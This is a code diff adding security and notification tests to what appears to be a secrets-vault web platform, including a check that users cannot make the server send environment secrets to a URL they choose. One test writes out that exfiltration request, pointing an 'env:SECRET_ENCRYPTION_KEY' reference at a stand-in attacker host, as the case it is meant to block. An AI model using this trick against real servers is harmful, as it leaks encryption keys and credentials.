@@ -175,6 +175,23 @@ def test_env_secrets_are_resolved_at_use_time(server, monkeypatch):
     assert c["hint"] == "env:SOME_VAR"
 
 
+def test_org_credentials_cannot_read_arbitrary_server_environment(server, monkeypatch):
+    """A builder must not be able to make the server send its own secrets (e.g. the vault key) to a URL they choose."""
+    builder = login(server, "builder")
+    r = builder.post("/api/v1/connections", json={"name": "exfil", "auth_type": "api_key_header", "api_key": "env:SECRET_ENCRYPTION_KEY",
+                                                  "test_url": "https://attacker.example.com"})
+    assert r.status_code == 422 and "CONNECTION_ENV_VARS" in r.json()["detail"]
+    org = builder.get("/api/v1/auth/me").json()["organization"]["id"]
+    monkeypatch.setenv("HEDES_NOT_LISTED", "server-only")
+    with session_scope() as db:   # even a value written directly (or before this rule existed) does not resolve
+        ref = vault.store_secret(db, None, {"api_key": "env:HEDES_NOT_LISTED"})
+        db.flush()
+        from app.models import Secret
+        db.get(Secret, ref.split(":", 1)[1]).organization_id = org
+        assert vault.read_secret(db, ref, org) == {"api_key": ""}
+        assert vault.read_secret(db, vault.store_secret(db, None, {"k": "env:HEDES_NOT_LISTED"}), None) == {"k": "server-only"}
+
+
 def test_alert_delivery_settings_and_thresholds(server, monkeypatch):
     admin = login(server, "admin")
     builder = login(server, "builder")
@@ -218,3 +235,55 @@ def test_repeated_source_failures_raise_one_alert(server, hr):
     mine = [a for a in admin.get("/api/v1/alerts").json() if a["kind"] == "source_failing"]
     assert len(mine) == alerts_before + 1 and "failed 2 runs in a row" in mine[0]["message"]      # fires once, at the threshold
     admin.patch("/api/v1/organizations/current/policy", json={"source_failure_alert_after": 3})
+
+
+def test_gmail_smtp_with_app_password(server, monkeypatch):
+    import smtplib
+
+    from app.models import Organization
+    from app.services import notify
+    admin = login(server, "admin")
+    base = {"enabled": True, "min_severity": "high"}
+    gmail = {"host": "smtp.gmail.com", "port": 25, "security": "none", "username": "alerts@gmail.com", "to": ["secops@example.com"]}
+
+    r = admin.put("/api/v1/settings/notifications", json={**base, "email": {**gmail, "password": "my-normal-password"}})
+    assert r.status_code == 422 and "app password" in r.json()["detail"]
+    r = admin.put("/api/v1/settings/notifications", json={**base, "email": {**gmail, "username": "alerts", "password": "abcd efgh ijkl mnop"}})
+    assert r.status_code == 422 and "full Gmail" in r.json()["detail"]
+
+    r = admin.put("/api/v1/settings/notifications", json={**base, "email": {**gmail, "password": "abcd efgh ijkl mnop"}})
+    assert r.status_code == 200, r.text
+    em = r.json()["email"]
+    assert (em["host"], em["port"], em["security"], em["from"], em["has_password"]) == ("smtp.gmail.com", 587, "starttls", "alerts@gmail.com", True)
+    org_id = admin.get("/api/v1/auth/me").json()["organization"]["id"]
+    with session_scope() as db:
+        cfg = notify.config_of(db.get(Organization, org_id))
+        assert vault.read_secret(db, cfg["email"]["password_ref"], org_id) == {"password": "abcdefghijklmnop"}  # spaces removed, encrypted
+
+    sent = {}
+
+    class FakeSMTP:
+        def __init__(self, host, port, timeout=None):
+            sent["server"] = (host, port)
+        def __enter__(self): return self
+        def __exit__(self, *a): return False
+        def starttls(self, context=None): sent["tls"] = True
+        def login(self, user, pw):
+            if pw != "abcdefghijklmnop":
+                raise smtplib.SMTPAuthenticationError(535, b"5.7.8 Username and Password not accepted")
+            sent["login"] = user
+        def send_message(self, msg): sent["from"] = msg["From"]
+
+    monkeypatch.setattr(notify.smtplib, "SMTP", FakeSMTP)
+    with session_scope() as db:
+        assert notify.send(db, db.get(Organization, org_id), "s", "t", ("email",)) == {"email": "sent"}
+    assert sent == {"server": ("smtp.gmail.com", 587), "tls": True, "login": "alerts@gmail.com", "from": "alerts@gmail.com"}
+
+    with session_scope() as db:
+        cfg = notify.config_of(db.get(Organization, org_id))
+        db.get(Organization, org_id).policy = {**db.get(Organization, org_id).policy,
+                                               "notifications": {**cfg, "email": {**cfg["email"], "password_ref": vault.store_secret(db, org_id, {"password": "wrongwrongwrongw"})}}}
+    with session_scope() as db:
+        out = notify.send(db, db.get(Organization, org_id), "s", "t", ("email",))["email"]
+    assert "app password" in out
+    admin.put("/api/v1/settings/notifications", json={"enabled": False, "min_severity": "high", "email": {"host": "", "to": []}})
